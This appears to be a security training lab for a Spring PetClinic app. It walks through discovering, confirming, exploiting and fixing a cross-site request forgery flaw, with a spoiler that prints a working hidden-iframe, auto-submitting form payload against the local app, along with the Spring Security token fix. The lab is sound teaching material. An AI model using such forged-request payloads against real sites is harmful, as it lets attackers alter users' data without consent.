@@ -1,0 +1,177 @@
+== Lab 05 - Cross-site request forgery ==
+
+Requirements:
+- Lab 01 completed
+- Lab 03 completed
+
+Goals:
+- CSRF in practice
+- Learn how Contrast Assess
+- Learn about Spring Security
+
+Task 1 - discovery
+- Launch application with Contrast
+- Navigate to Find Owners and perform a last name search: Davis
+- Click Betty Davis
+- Edit Betty Davis information & save
+- Contrast UI: navigate Applications -> your application -> Vulnerabilities
+- Review the CSRF details
+- PASS: Contrast Assess succesfully discovers CSRF vulnerability
+
+Task 2 - confirmation
+- Contrast UI: examine vulnerability details
+- Find the root cause:
+ * Examine the method that handles the owner edit
+ * Examine the Thymeleaf template
+ 
+- PASS: You are able to find the root cause
+
+Task 3 - exploit
+- Craft a demonstration exploit with that changes Betty Davis's address to Hacked
+when user visits a different page
+ * Use web browser developer tools to observe form submission
+ * exploit has to POST form data as the app not have GET handler
+ * create a html page or edit for instance vetList.html template to include the exploit
+- Prevent user from being redirected
+
+Task 4 - remediation
+- Use Spring Security framework to add a CSRF token
+ * uncomment spring-boot-starter-security in pom.xml
+ * uncomment org.springframework.samples.petclininc.WebMVCSecurityConfig.java
+- Review what @EnableWebSecurity annotation does
+- Test what happens when you attempt to use the form normally
+- Add Spring Security CSRF token to the form
+ * As the form does not have an explicit action target, Spring Security does not auto-add the token
+ * We need to add a new hidden input using Thymeleaf templating
+- PASS: form submission works and anti-csrf token prevents form submission from an external source
+
+
+
+== End of Lab ==
+
+Hints & spoilers below
+
+
+
+
+
+
+
+
+
+
+
+
+
+Hints:
+
+
+
+
+
+
+Task 3
+ * https://stackoverflow.com/questions/6812765/how-to-demonstrate-a-csrf-attack
+ * https://stackoverflow.com/questions/48106019/post-a-form-without-redirecting-with-ajax-jquery 
+
+
+
+Task 4
+ 
+
+
+
+
+
+
+Spoilers:
+
+
+
+
+below
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Task 3:
+- Craft a html page or edit a template file to include:
+
+    <iframe src="about:blank" name="exploit_iframe" height="0" width="0" style="display: none;"></iframe>
+    <form name="exploit_form" id="exploit_form" action="http://localhost:8080/owners/2/edit" method="POST" target="exploit_iframe">
+      <input type="hidden" name="firstName" value="Betty">
+      <input type="hidden" name="lastName" value="Davis">
+      <input type="hidden" name="address" value="hacked">
+      <input type="hidden" name="city" value="Sun Prairie">
+      <input type="hidden" name="telephone" value="6085551749">
+    </form>
+    <script type="text/javascript">document.exploit_form.submit();</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Task 4:
+- After enabling Spring Security, add the following to the vulnerable form:
+<input type="hidden" th:name="${_csrf.parameterName}" th:value="${_csrf.token}" />
